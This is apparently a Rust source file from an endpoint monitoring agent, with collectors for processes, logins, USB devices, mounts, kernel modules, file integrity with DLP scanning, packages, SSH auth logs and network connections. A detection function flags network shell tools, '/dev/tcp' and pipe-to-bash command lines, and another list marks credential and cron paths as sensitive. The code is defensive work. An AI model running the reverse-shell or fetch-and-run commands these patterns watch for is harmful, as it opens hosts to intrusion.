//! Endpoint collectors. Each produces real telemetry from the host:
//!   - process: new process executions (pid/ppid/cmdline/parent lineage)
//!   - login:   interactive logins / logouts (via `who`)
//!   - usb:     removable device attach/detach
//!   - fim:     file integrity monitoring (create/modify/delete + content DLP scan)
//!   - package: package manager install/remove drift
//!   - network: established outbound connections
//! These are cross-platform polling/log-based collectors that run on any host. Kernel-grade
//! sources (auditd, udev, fanotify, eBPF) for higher-fidelity capture are the documented
//! production roadmap (see docs/) — they are NOT yet implemented here.

use std::collections::{HashMap, HashSet};
use std::io::{Read, Seek, SeekFrom};
use std::process::Command;

use regex::Regex;
use sha2::{Digest, Sha256};
use sysinfo::{Pid, ProcessesToUpdate, System, Users};
use walkdir::WalkDir;

use crate::dlp;
use crate::event::{AuthInfo, DlpInfo, Event, FileInfo, NetInfo, Process, UsbInfo};

/// Categorize a destination domain for internet/browser monitoring.
pub fn categorize_domain(domain: &str) -> &'static str {
    let d = domain.to_lowercase();
    const WEBMAIL: [&str; 5] = ["mail.google", "outlook", "gmail", "proton.me", "yahoo.com"];
    const CLOUD: [&str; 7] = [
        "drive.google",
        "dropbox",
        "box.com",
        "wetransfer",
        "mega.nz",
        "s3.amazonaws",
        "onedrive",
    ];
    const SOCIAL: [&str; 5] = ["facebook", "twitter", "instagram", "tiktok", "reddit"];
    const DEV: [&str; 3] = ["github", "gitlab", "bitbucket"];
    if WEBMAIL.iter().any(|x| d.contains(x)) {
        return "webmail";
    }
    if CLOUD.iter().any(|x| d.contains(x)) {
        return "cloud_storage";
    }
    if SOCIAL.iter().any(|x| d.contains(x)) {
        return "social";
    }
    if DEV.iter().any(|x| d.contains(x)) {
        return "dev";
    }
    "web"
}

// ---------------- process ----------------

pub struct ProcessCollector {
    sys: System,
    users: Users,
    seen: HashSet<u32>,
    first: bool,
    ticks: u64,
}

impl ProcessCollector {
    pub fn new() -> Self {
        ProcessCollector {
            sys: System::new(),
            users: Users::new_with_refreshed_list(),
            seen: HashSet::new(),
            first: true,
            ticks: 0,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        self.sys.refresh_processes(ProcessesToUpdate::All, true);
        // Refresh the uid->name table occasionally so new accounts resolve (cheap; not every poll).
        self.ticks = self.ticks.wrapping_add(1);
        if self.ticks % 30 == 0 {
            self.users.refresh_list();
        }
        let mut out = Vec::new();
        let mut current = HashSet::new();
        // snapshot pid->name for parent lineage
        let names: HashMap<Pid, String> = self
            .sys
            .processes()
            .iter()
            .map(|(pid, p)| (*pid, p.name().to_string_lossy().to_string()))
            .collect();

        for (pid, proc_) in self.sys.processes() {
            let pidu = pid.as_u32();
            current.insert(pidu);
            if self.seen.contains(&pidu) {
                continue;
            }
            if self.first {
                continue; // don't flood with the initial process table
            }
            let parent = proc_
                .parent()
                .and_then(|pp| names.get(&pp))
                .cloned()
                .unwrap_or_default();
            let cmdline = proc_
                .cmd()
                .iter()
                .map(|s| s.to_string_lossy())
                .collect::<Vec<_>>()
                .join(" ");
            let exe = proc_
                .exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_default();
            let name = proc_.name().to_string_lossy().to_string();
            // Real acting identity (was hardcoded uid 0 / empty user → killed user-scoped rules).
            let uid_obj = proc_.user_id();
            let uid: i64 = uid_obj
                .and_then(|u| u.to_string().parse::<i64>().ok())
                .unwrap_or(0);
            let user = uid_obj
                .and_then(|u| self.users.get_user_by_id(u))
                .map(|u| u.name().to_string())
                .unwrap_or_default();
            // Full ancestry chain (pid1→…→self), not just the immediate parent.
            let mut chain = vec![name.clone()];
            let mut cur = proc_.parent();
            let mut depth = 0;
            while let Some(pp) = cur {
                if depth > 16 {
                    break;
                }
                if let Some(pn) = names.get(&pp) {
                    chain.push(pn.clone());
                }
                cur = self.sys.process(pp).and_then(|p| p.parent());
                depth += 1;
            }
            chain.reverse();
            let lineage = chain.join("→");
            let container = container_of(pidu);
            let sev = if is_suspicious(&name, &cmdline) {
                "medium"
            } else {
                "info"
            };
            let mut ev = Event::new("process", "exec", sev)
                .with_user(&user)
                .msg(format!("{} executed: {}", name, truncate(&cmdline, 240)));
            ev.process = Some(Process {
                pid: pidu as i64,
                ppid: proc_.parent().map(|p| p.as_u32() as i64).unwrap_or(0),
                name,
                exe,
                cmdline,
                uid,
                user,
                parent,
                lineage,
                container,
            });
            out.push(ev);
        }
        self.seen = current;
        self.first = false;
        out
    }
}

fn is_suspicious(name: &str, cmd: &str) -> bool {
    const TOOLS: [&str; 8] = [
        "nc", "ncat", "socat", "nmap", "tcpdump", "scp", "rsync", "base64",
    ];
    TOOLS.contains(&name)
        || cmd.contains("/dev/tcp")
        || cmd.contains("| bash")
        || cmd.contains("curl ")
}

/// Container context for a pid from its cgroup membership ("" if not containerized).
fn container_of(pid: u32) -> String {
    #[cfg(target_os = "linux")]
    {
        return std::fs::read_to_string(format!("/proc/{pid}/cgroup"))
            .map(|t| parse_container_from_cgroup(&t))
            .unwrap_or_default();
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = pid;
        String::new()
    }
}

/// Derive "runtime:shortid" from a /proc/<pid>/cgroup body. Recognizes docker, containerd/CRI,
/// podman and generic kubepods paths. Returns "" when the task isn't in a container.
fn parse_container_from_cgroup(text: &str) -> String {
    for line in text.lines() {
        let path = line.rsplit(':').next().unwrap_or(line);
        let id = match longest_hex_run(path) {
            Some(id) => id,
            None => continue,
        };
        let runtime = if path.contains("docker") {
            "docker"
        } else if path.contains("crio") {
            "crio"
        } else if path.contains("containerd") || path.contains("cri-containerd") {
            "containerd"
        } else if path.contains("libpod") || path.contains("podman") {
            "podman"
        } else if path.contains("kubepods") {
            "k8s"
        } else {
            "container"
        };
        return format!("{}:{}", runtime, &id[..id.len().min(12)]);
    }
    String::new()
}

/// Longest contiguous hex run >= 32 chars (a container id; avoids matching dictionary words).
fn longest_hex_run(s: &str) -> Option<String> {
    let mut longest = String::new();
    let mut run = String::new();
    for c in s.chars() {
        if c.is_ascii_hexdigit() {
            run.push(c);
        } else {
            if run.len() > longest.len() {
                longest = std::mem::take(&mut run);
            } else {
                run.clear();
            }
        }
    }
    if run.len() > longest.len() {
        longest = run;
    }
    if longest.len() >= 32 {
        Some(longest)
    } else {
        None
    }
}

// ---------------- login ----------------

pub struct LoginCollector {
    seen: HashSet<String>,
    first: bool,
}

impl LoginCollector {
    pub fn new() -> Self {
        LoginCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let mut out = Vec::new();
        let output = match Command::new("who").output() {
            Ok(o) => o,
            Err(_) => return out,
        };
        let text = String::from_utf8_lossy(&output.stdout);
        let mut current = HashSet::new();
        for line in text.lines() {
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.is_empty() {
                continue;
            }
            let user = fields[0].to_string();
            let tty = fields.get(1).cloned().unwrap_or("").to_string();
            let src = line
                .find('(')
                .and_then(|i| {
                    line[i + 1..]
                        .find(')')
                        .map(|j| line[i + 1..i + 1 + j].to_string())
                })
                .unwrap_or_default();
            let key = format!("{user}|{tty}|{src}");
            current.insert(key.clone());
            if !self.seen.contains(&key) && !self.first {
                let mut ev = Event::new("auth", "login", "info")
                    .with_user(&user)
                    .msg(format!(
                        "login: {user} on {tty} from {}",
                        if src.is_empty() { "local" } else { &src }
                    ));
                ev.auth = Some(AuthInfo {
                    method: if src.is_empty() {
                        "local".into()
                    } else {
                        "network".into()
                    },
                    source_ip: src,
                    tty,
                    result: "success".into(),
                });
                out.push(ev);
            }
        }
        // logouts
        for old in self.seen.difference(&current) {
            let parts: Vec<&str> = old.split('|').collect();
            let user = parts.first().cloned().unwrap_or("");
            out.push(
                Event::new("auth", "logout", "info")
                    .with_user(user)
                    .msg(format!("logout: {user}")),
            );
        }
        self.seen = current;
        self.first = false;
        out
    }
}

// ---------------- usb ----------------

pub struct UsbCollector {
    seen: HashSet<String>,
    first: bool,
}

impl UsbCollector {
    pub fn new() -> Self {
        UsbCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let devices = list_usb();
        let mut out = Vec::new();
        let current: HashSet<String> = devices.iter().map(|d| d.serial.clone()).collect();
        for d in &devices {
            if !self.seen.contains(&d.serial) && !self.first {
                let mut ev = Event::new("usb", "insert", "medium")
                    .msg(format!("USB device connected: {} {}", d.vendor, d.product));
                ev.usb = Some(UsbInfo {
                    action: "insert".into(),
                    vendor: d.vendor.clone(),
                    product: d.product.clone(),
                    serial: d.serial.clone(),
                    mount: String::new(),
                    size_gb: 0,
                });
                out.push(ev);
            }
        }
        for old in self.seen.difference(&current) {
            let mut ev = Event::new("usb", "remove", "info").msg("USB device removed");
            ev.usb = Some(UsbInfo {
                action: "remove".into(),
                serial: old.clone(),
                ..Default::default()
            });
            out.push(ev);
        }
        self.seen = current;
        self.first = false;
        out
    }
}

#[derive(Default)]
struct Usb {
    vendor: String,
    product: String,
    serial: String,
}

fn list_usb() -> Vec<Usb> {
    #[cfg(target_os = "macos")]
    {
        let out = match Command::new("system_profiler")
            .arg("SPUSBDataType")
            .output()
        {
            Ok(o) => o,
            Err(_) => return Vec::new(),
        };
        let text = String::from_utf8_lossy(&out.stdout);
        let mut devices = Vec::new();
        let mut cur = Usb::default();
        let mut have = false;
        for line in text.lines() {
            let t = line.trim();
            if t.ends_with(':')
                && !t.contains("Serial Number")
                && line.starts_with("    ")
                && !line.starts_with("      ")
            {
                if have && !cur.product.is_empty() {
                    devices.push(std::mem::take(&mut cur));
                }
                cur = Usb {
                    product: t.trim_end_matches(':').to_string(),
                    ..Default::default()
                };
                have = true;
            } else if let Some(v) = t.strip_prefix("Serial Number:") {
                cur.serial = v.trim().to_string();
            } else if let Some(v) = t.strip_prefix("Manufacturer:") {
                cur.vendor = v.trim().to_string();
            }
        }
        if have && !cur.product.is_empty() {
            if cur.serial.is_empty() {
                cur.serial = cur.product.clone();
            }
            devices.push(cur);
        }
        for d in devices.iter_mut() {
            if d.serial.is_empty() {
                d.serial = d.product.clone();
            }
        }
        return devices;
    }
    #[cfg(target_os = "linux")]
    {
        let mut devices = Vec::new();
        let base = std::path::Path::new("/sys/bus/usb/devices");
        if let Ok(entries) = std::fs::read_dir(base) {
            for e in entries.flatten() {
                let p = e.path();
                let product = read_trim(&p.join("product"));
                let serial = read_trim(&p.join("serial"));
                let vendor = read_trim(&p.join("manufacturer"));
                if product.is_empty() && serial.is_empty() {
                    continue;
                }
                let id = if serial.is_empty() {
                    format!("{}-{}", vendor, product)
                } else {
                    serial.clone()
                };
                devices.push(Usb {
                    vendor,
                    product,
                    serial: id,
                });
            }
        }
        return devices;
    }
    #[allow(unreachable_code)]
    Vec::new()
}

#[cfg(target_os = "linux")]
fn read_trim(p: &std::path::Path) -> String {
    std::fs::read_to_string(p)
        .map(|s| s.trim().to_string())
        .unwrap_or_default()
}

// ---------------- removable-media mounts ----------------

/// Watches for filesystems mounted under removable-media paths (USB sticks, SD cards, phones,
/// FUSE shares mounted there). Complements UsbCollector (which sees the device) by capturing
/// the actual mount, which is where data exfiltration to removable media happens.
pub struct MountCollector {
    seen: HashSet<String>,
    first: bool,
}

impl MountCollector {
    pub fn new() -> Self {
        MountCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let mounts = removable_mounts();
        let current: HashSet<String> = mounts.iter().map(|m| m.key()).collect();
        let mut out = Vec::new();
        for m in &mounts {
            if !self.seen.contains(&m.key()) && !self.first {
                let mut ev = Event::new("usb", "mount", "medium").msg(format!(
                    "removable media mounted: {} at {} ({})",
                    m.device, m.mountpoint, m.fstype
                ));
                ev.usb = Some(UsbInfo {
                    action: "mount".into(),
                    product: m.device.clone(),
                    mount: m.mountpoint.clone(),
                    ..Default::default()
                });
                out.push(ev);
            }
        }
        for old in self.seen.difference(&current) {
            let mp = old.split('\t').nth(1).unwrap_or("").to_string();
            let mut ev =
                Event::new("usb", "unmount", "info").msg(format!("removable media unmounted: {mp}"));
            ev.usb = Some(UsbInfo {
                action: "unmount".into(),
                mount: mp,
                ..Default::default()
            });
            out.push(ev);
        }
        self.seen = current;
        self.first = false;
        out
    }
}

struct Mount {
    device: String,
    mountpoint: String,
    fstype: String,
}

impl Mount {
    fn key(&self) -> String {
        format!("{}\t{}", self.device, self.mountpoint)
    }
}

/// Mount points considered "removable media" for monitoring purposes.
const REMOVABLE_PREFIXES: [&str; 4] = ["/media", "/mnt", "/run/media", "/Volumes"];

fn is_removable_mount(mountpoint: &str) -> bool {
    REMOVABLE_PREFIXES
        .iter()
        .any(|p| mountpoint == *p || mountpoint.starts_with(&format!("{p}/")))
}

/// Parse /proc/mounts text into removable-media mounts. Pure (testable). Octal-escaped spaces
/// (\040) in paths are decoded; pseudo filesystems are skipped.
fn parse_proc_mounts(text: &str) -> Vec<Mount> {
    const PSEUDO: [&str; 8] = [
        "proc", "sysfs", "tmpfs", "devtmpfs", "cgroup", "cgroup2", "devpts", "mqueue",
    ];
    let unescape = |s: &str| s.replace("\\040", " ").replace("\\011", "\t");
    let mut out = Vec::new();
    for line in text.lines() {
        let f: Vec<&str> = line.split_whitespace().collect();
        if f.len() < 3 {
            continue;
        }
        let mountpoint = unescape(f[1]);
        let fstype = f[2].to_string();
        if PSEUDO.contains(&fstype.as_str()) || !is_removable_mount(&mountpoint) {
            continue;
        }
        out.push(Mount {
            device: unescape(f[0]),
            mountpoint,
            fstype,
        });
    }
    out
}

fn removable_mounts() -> Vec<Mount> {
    #[cfg(target_os = "linux")]
    {
        return std::fs::read_to_string("/proc/mounts")
            .map(|t| parse_proc_mounts(&t))
            .unwrap_or_default();
    }
    #[cfg(target_os = "macos")]
    {
        let out = match Command::new("mount").output() {
            Ok(o) => o,
            Err(_) => return Vec::new(),
        };
        let text = String::from_utf8_lossy(&out.stdout);
        let mut mounts = Vec::new();
        for line in text.lines() {
            // "device on /Volumes/Name (fstype, ...)"
            if let Some((dev, rest)) = line.split_once(" on ") {
                if let Some((mp, tail)) = rest.split_once(" (") {
                    if is_removable_mount(mp) {
                        let fstype = tail.split([',', ')']).next().unwrap_or("").to_string();
                        mounts.push(Mount {
                            device: dev.to_string(),
                            mountpoint: mp.to_string(),
                            fstype,
                        });
                    }
                }
            }
        }
        return mounts;
    }
    #[allow(unreachable_code)]
    Vec::new()
}

// ---------------- kernel modules ----------------

/// Watches for newly loaded kernel modules — a core rootkit / unexpected-driver signal. Reads
/// /proc/modules and diffs; the initial snapshot is suppressed so only post-start loads fire.
pub struct ModuleCollector {
    seen: HashSet<String>,
    first: bool,
}

impl ModuleCollector {
    pub fn new() -> Self {
        ModuleCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let current: HashSet<String> = loaded_modules().into_iter().collect();
        let mut out = Vec::new();
        if !self.first {
            for m in current.difference(&self.seen) {
                let mut ev = Event::new("system", "kmod_load", "medium")
                    .msg(format!("kernel module loaded: {m}"));
                ev.extra
                    .insert("module".into(), serde_json::Value::String(m.clone()));
                out.push(ev);
            }
        }
        self.seen = current;
        self.first = false;
        out
    }
}

/// First token of each /proc/modules line = the module name. Pure (testable).
fn parse_proc_modules(text: &str) -> Vec<String> {
    text.lines()
        .filter_map(|l| l.split_whitespace().next().map(|s| s.to_string()))
        .collect()
}

fn loaded_modules() -> Vec<String> {
    #[cfg(target_os = "linux")]
    {
        return std::fs::read_to_string("/proc/modules")
            .map(|t| parse_proc_modules(&t))
            .unwrap_or_default();
    }
    #[cfg(not(target_os = "linux"))]
    {
        Vec::new()
    }
}

// ---------------- file integrity monitoring ----------------

pub struct FimCollector {
    dirs: Vec<String>,
    hashes: HashMap<String, String>,
    first: bool,
    max_files: usize,
    max_scan_bytes: usize,
}

impl FimCollector {
    pub fn new(dirs: Vec<String>) -> Self {
        FimCollector {
            dirs,
            hashes: HashMap::new(),
            first: true,
            max_files: 4000,
            max_scan_bytes: 1_000_000,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let mut out = Vec::new();
        let mut current: HashMap<String, String> = HashMap::new();
        let mut count = 0;
        for dir in &self.dirs {
            if !std::path::Path::new(dir).exists() {
                continue;
            }
            for entry in WalkDir::new(dir)
                .max_depth(4)
                .into_iter()
                .filter_map(|e| e.ok())
            {
                if count >= self.max_files {
                    break;
                }
                if !entry.file_type().is_file() {
                    continue;
                }
                let path = entry.path().to_string_lossy().to_string();
                let meta = match entry.metadata() {
                    Ok(m) => m,
                    Err(_) => continue,
                };
                let size = meta.len();
                // hash small/medium files; for big files use size+mtime signature
                let sig = if size <= self.max_scan_bytes as u64 {
                    hash_file(entry.path()).unwrap_or_default()
                } else {
                    format!("size:{size}")
                };
                count += 1;
                let prev = self.hashes.get(&path).cloned();
                current.insert(path.clone(), sig.clone());
                if self.first {
                    continue;
                }
                match prev {
                    None => out.push(self.file_event(&path, "create", size as i64, &sig)),
                    Some(old) if old != sig => {
                        let mut ev = self.file_event(&path, "write", size as i64, &sig);
                        // DLP content inspection on change
                        if size <= self.max_scan_bytes as u64 {
                            if let Ok(content) = std::fs::read_to_string(entry.path()) {
                                if let Some(dev) = dlp_event_for(&path, &content) {
                                    out.push(dev);
                                }
                            }
                        }
                        ev.severity = bump_for_path(&path);
                        out.push(ev);
                    }
                    _ => {}
                }
            }
        }
        if !self.first {
            for old in self.hashes.keys() {
                if !current.contains_key(old) {
                    out.push(self.file_event(old, "delete", 0, ""));
                }
            }
        }
        self.hashes = current;
        self.first = false;
        out
    }

    fn file_event(&self, path: &str, op: &str, size: i64, hash: &str) -> Event {
        let mut ev = Event::new("file", &format!("file_{op}"), &bump_for_path(path))
            .msg(format!("{op} {path}"));
        ev.file = Some(FileInfo {
            path: path.to_string(),
            op: op.to_string(),
            size,
            mode: String::new(),
            hash: hash.to_string(),
            is_dir: false,
        });
        ev
    }
}

fn bump_for_path(path: &str) -> String {
    const SENSITIVE: [&str; 8] = [
        "/etc/cron",
        "/etc/systemd",
        "authorized_keys",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/var/www",
        "rc.local",
    ];
    if SENSITIVE.iter().any(|s| path.contains(s)) {
        "medium".into()
    } else {
        "info".into()
    }
}

fn dlp_event_for(path: &str, content: &str) -> Option<Event> {
    let findings = dlp::scan(content);
    let f = findings.into_iter().max_by_key(|f| f.matches)?;
    let mut ev = Event::new("dlp", "content_match", &f.severity)
        .msg(format!("{} found in {}", f.label, path));
    ev.file = Some(FileInfo {
        path: path.to_string(),
        op: "read".into(),
        ..Default::default()
    });
    ev.dlp = Some(DlpInfo {
        classifier: f.classifier,
        channel: "file".into(),
        matches: f.matches as i64,
        sample: f.sample,
        policy: String::new(),
        verdict: String::new(),
    });
    Some(ev)
}

fn hash_file(path: &std::path::Path) -> Option<String> {
    let data = std::fs::read(path).ok()?;
    let mut h = Sha256::new();
    h.update(&data);
    Some(format!("{:x}", h.finalize()))
}

// ---------------- package ----------------

pub struct PackageCollector {
    seen: HashSet<String>,
    first: bool,
}

impl PackageCollector {
    pub fn new() -> Self {
        PackageCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let pkgs = list_packages();
        if pkgs.is_empty() {
            return Vec::new();
        }
        let current: HashSet<String> = pkgs.into_iter().collect();
        let mut out = Vec::new();
        if !self.first {
            for p in current.difference(&self.seen) {
                out.push(
                    Event::new("package", "package_install", "low")
                        .msg(format!("package installed: {p}")),
                );
            }
            for p in self.seen.difference(&current) {
                out.push(
                    Event::new("package", "package_remove", "low")
                        .msg(format!("package removed: {p}")),
                );
            }
        }
        self.seen = current;
        self.first = false;
        out
    }
}

fn list_packages() -> Vec<String> {
    let candidates: &[(&str, &[&str])] = &[
        ("dpkg-query", &["-W", "-f=${Package}\n"]),
        ("rpm", &["-qa"]),
        ("brew", &["list", "--formula"]),
        ("pacman", &["-Qq"]),
    ];
    for (bin, args) in candidates {
        if let Ok(out) = Command::new(bin).args(*args).output() {
            if out.status.success() {
                return String::from_utf8_lossy(&out.stdout)
                    .lines()
                    .map(|l| l.trim().to_string())
                    .filter(|l| !l.is_empty())
                    .collect();
            }
        }
    }
    Vec::new()
}

// ---------------- ssh / auth log ----------------

/// Reads new lines from system auth logs to capture SSH success/failure and sudo use —
/// events the snapshot collectors cannot see. Tracks a byte offset per file so each line
/// is reported once. Linux/Unix only; absent files are skipped.
pub struct AuthLogCollector {
    offsets: HashMap<String, u64>,
    files: Vec<String>,
    re_failed: Regex,
    re_accepted: Regex,
    re_sudo: Regex,
    first: bool,
}

impl AuthLogCollector {
    pub fn new() -> Self {
        AuthLogCollector {
            offsets: HashMap::new(),
            files: vec!["/var/log/auth.log".into(), "/var/log/secure".into()],
            re_failed: Regex::new(r"Failed password for (?:invalid user )?(\S+) from (\S+)")
                .unwrap(),
            re_accepted: Regex::new(r"Accepted (\w+) for (\S+) from (\S+)").unwrap(),
            re_sudo: Regex::new(r"sudo:\s+(\S+)\s+:.*COMMAND=(.+)$").unwrap(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let mut out = Vec::new();
        for path in self.files.clone() {
            let Ok(mut f) = std::fs::File::open(&path) else {
                continue;
            };
            let len = f.metadata().map(|m| m.len()).unwrap_or(0);
            let mut off = *self.offsets.get(&path).unwrap_or(&0);
            if self.first {
                // start from the end on first run; don't replay history
                self.offsets.insert(path.clone(), len);
                continue;
            }
            if len < off {
                off = 0; // rotated
            }
            if len == off {
                continue;
            }
            if f.seek(SeekFrom::Start(off)).is_err() {
                continue;
            }
            let mut buf = String::new();
            if f.take(1_000_000).read_to_string(&mut buf).is_err() {
                continue;
            }
            self.offsets.insert(path.clone(), len);
            for line in buf.lines() {
                if let Some(c) = self.re_failed.captures(line) {
                    out.push(self.auth(
                        &c[1],
                        &c[2],
                        "failure",
                        "ssh",
                        "auth_fail",
                        "low",
                        format!("failed password for {} from {}", &c[1], &c[2]),
                    ));
                } else if let Some(c) = self.re_accepted.captures(line) {
                    out.push(self.auth(
                        &c[2],
                        &c[3],
                        "success",
                        "ssh",
                        "login",
                        "info",
                        format!("accepted {} for {} from {}", &c[1], &c[2], &c[3]),
                    ));
                } else if let Some(c) = self.re_sudo.captures(line) {
                    let mut ev = Event::new("ssh", "sudo", "medium")
                        .with_user(&c[1])
                        .msg(format!("sudo by {}: {}", &c[1], c[2].trim()));
                    ev.process = Some(Process {
                        name: "sudo".into(),
                        cmdline: c[2].trim().into(),
                        user: c[1].into(),
                        ..Default::default()
                    });
                    out.push(ev);
                }
            }
        }
        self.first = false;
        out
    }

    fn auth(
        &self,
        user: &str,
        ip: &str,
        result: &str,
        cat: &str,
        action: &str,
        sev: &str,
        msg: String,
    ) -> Event {
        let mut ev = Event::new(cat, action, sev).with_user(user).msg(msg);
        ev.auth = Some(AuthInfo {
            method: "password".into(),
            source_ip: ip.into(),
            tty: "ssh".into(),
            result: result.into(),
        });
        ev
    }
}

// ---------------- network ----------------

pub struct NetworkCollector {
    seen: HashSet<String>,
    first: bool,
}

impl NetworkCollector {
    pub fn new() -> Self {
        NetworkCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let conns = established_connections();
        let current: HashSet<String> = conns.iter().map(|c| c.key()).collect();
        let mut out = Vec::new();
        for conn in &conns {
            let key = conn.key();
            if !self.seen.contains(&key) && !self.first {
                let who = if conn.process.is_empty() {
                    String::new()
                } else {
                    format!(" by {} (pid {})", conn.process, conn.pid)
                };
                let mut ev = Event::new("network", "connect", "info").msg(format!(
                    "outbound {} connection to {}{}",
                    conn.proto, conn.remote, who
                ));
                ev.network = Some(NetInfo {
                    direction: "outbound".into(),
                    proto: conn.proto.clone(),
                    local_addr: conn.local.clone(),
                    remote: conn.remote.clone(),
                    category: conn.category(),
                    bytes_out: conn.bytes_out,
                    bytes_in: conn.bytes_in,
                    ..Default::default()
                });
                if conn.pid > 0 {
                    ev.process = Some(Process {
                        pid: conn.pid,
                        name: conn.process.clone(),
                        ..Default::default()
                    });
                }
                out.push(ev);
            }
        }
        self.seen = current;
        self.first = false;
        out
    }
}

#[derive(Clone, Default)]
struct Conn {
    proto: String,
    local: String,
    remote: String,
    pid: i64,
    process: String,
    bytes_out: i64,
    bytes_in: i64,
}

impl Conn {
    fn key(&self) -> String {
        format!("{}|{}|{}", self.proto, self.local, self.remote)
    }

    fn category(&self) -> String {
        match remote_port(&self.remote).as_deref() {
            Some("80") | Some("443") | Some("8080") => "web".into(),
            _ => String::new(),
        }
    }
}

/// Parse ss's process column `users:(("name",pid=1234,fd=5))` → (pid, name). First socket
/// owner only (the common case). Returns (0, "") when no process info is present.
fn parse_ss_process(field: &str) -> (i64, String) {
    let name = field
        .split_once("((\"")
        .and_then(|(_, rest)| rest.split_once('"'))
        .map(|(n, _)| n.to_string())
        .unwrap_or_default();
    let pid = field
        .split_once("pid=")
        .and_then(|(_, rest)| {
            let end = rest.find(|c: char| !c.is_ascii_digit()).unwrap_or(rest.len());
            rest[..end].parse::<i64>().ok()
        })
        .unwrap_or(0);
    (pid, name)
}

/// Parse `bytes_sent:N` / `bytes_received:N` from an `ss -i` info line → (out, in).
fn parse_ss_bytes(info: &str) -> (i64, i64) {
    let field = |k: &str| -> i64 {
        info.split_once(k)
            .and_then(|(_, rest)| {
                let end = rest.find(|c: char| !c.is_ascii_digit()).unwrap_or(rest.len());
                rest[..end].parse::<i64>().ok()
            })
            .unwrap_or(0)
    };
    (field("bytes_sent:"), field("bytes_received:"))
}

fn established_connections() -> Vec<Conn> {
    #[cfg(target_os = "macos")]
    {
        let out = match Command::new("lsof")
            .args(["-nP", "-iTCP", "-sTCP:ESTABLISHED"])
            .output()
        {
            Ok(o) => o,
            Err(_) => return Vec::new(),
        };
        let text = String::from_utf8_lossy(&out.stdout);
        let mut set: HashMap<String, Conn> = HashMap::new();
        for line in text.lines().filter(|l| !l.starts_with("COMMAND")) {
            for tok in line.split_whitespace() {
                if let Some((local, remote)) = tok.split_once("->") {
                    if is_remote(remote) {
                        let c = Conn {
                            proto: "tcp".into(),
                            local: local.into(),
                            remote: remote.into(),
                            ..Default::default()
                        };
                        set.insert(c.key(), c);
                    }
                }
            }
        }
        return set.into_values().take(50).collect();
    }
    #[cfg(not(target_os = "macos"))]
    {
        // -i adds a per-socket info line (bytes_sent/received); -p adds the owning process.
        let out = match Command::new("ss")
            .args(["-tunpi", "state", "established"])
            .output()
        {
            Ok(o) => o,
            Err(_) => return Vec::new(),
        };
        let text = String::from_utf8_lossy(&out.stdout);
        let mut conns: Vec<Conn> = Vec::new();
        for line in text.lines() {
            if line.starts_with("Netid") || line.trim().is_empty() {
                continue;
            }
            // Indented continuation = the `-i` info line for the previous connection.
            if line.starts_with(char::is_whitespace) {
                if let Some(last) = conns.last_mut() {
                    let (o, i) = parse_ss_bytes(line);
                    last.bytes_out = o;
                    last.bytes_in = i;
                }
                continue;
            }
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() < 5 {
                continue;
            }
            let remote = fields[4].to_string();
            if !is_remote(&remote) {
                continue;
            }
            let (pid, process) = fields
                .iter()
                .find(|f| f.starts_with("users:("))
                .map(|&f| parse_ss_process(f))
                .unwrap_or((0, String::new()));
            conns.push(Conn {
                proto: fields[0].to_string(),
                local: fields[3].to_string(),
                remote,
                pid,
                process,
                bytes_out: 0,
                bytes_in: 0,
            });
        }
        // De-dup by 5-tuple, keep first; cap to avoid floods.
        let mut set: HashMap<String, Conn> = HashMap::new();
        for c in conns {
            set.entry(c.key()).or_insert(c);
        }
        return set.into_values().take(50).collect();
    }
    #[allow(unreachable_code)]
    Vec::new()
}

fn is_remote(addr: &str) -> bool {
    !(addr.starts_with("127.")
        || addr.starts_with("::1")
        || addr.starts_with("localhost")
        || addr.starts_with("0.0.0.0")
        || addr.starts_with("*"))
}

fn remote_port(addr: &str) -> Option<String> {
    let trimmed = addr.trim_end_matches(',');
    trimmed
        .rsplit_once(':')
        .map(|(_, port)| port.trim_matches(']').to_string())
}

fn truncate(s: &str, n: usize) -> String {
    if s.len() <= n {
        return s.to_string();
    }
    // Cut on a UTF-8 char boundary — slicing raw bytes panics on multibyte cmdlines.
    let mut end = n;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &s[..end])
}

#[cfg(test)]
mod p0_tests {
    use super::*;

    #[test]
    fn ss_process_field_parses_pid_and_name() {
        let (pid, name) = parse_ss_process(r#"users:(("curl",pid=1234,fd=5))"#);
        assert_eq!(pid, 1234);
        assert_eq!(name, "curl");
        // no process info → zeros
        assert_eq!(parse_ss_process("-"), (0, String::new()));
    }

    #[test]
    fn ss_info_line_parses_bytes() {
        let line = " cubic wscale:7,7 rto:204 bytes_sent:54321 bytes_acked:54000 bytes_received:678 segs_out:9";
        let (out, inb) = parse_ss_bytes(line);
        assert_eq!(out, 54321);
        assert_eq!(inb, 678);
    }

    #[test]
    fn removable_mount_prefixes() {
        assert!(is_removable_mount("/media/usb0"));
        assert!(is_removable_mount("/run/media/alice/STICK"));
        assert!(is_removable_mount("/mnt"));
        assert!(!is_removable_mount("/"));
        assert!(!is_removable_mount("/home/alice"));
    }

    #[test]
    fn cgroup_detects_docker_container() {
        let id = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f60011";
        let text = format!("0::/system.slice/docker-{id}.scope");
        let got = parse_container_from_cgroup(&text);
        assert_eq!(got, format!("docker:{}", &id[..12]));
    }

    #[test]
    fn cgroup_kubepods_and_bare() {
        let id = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
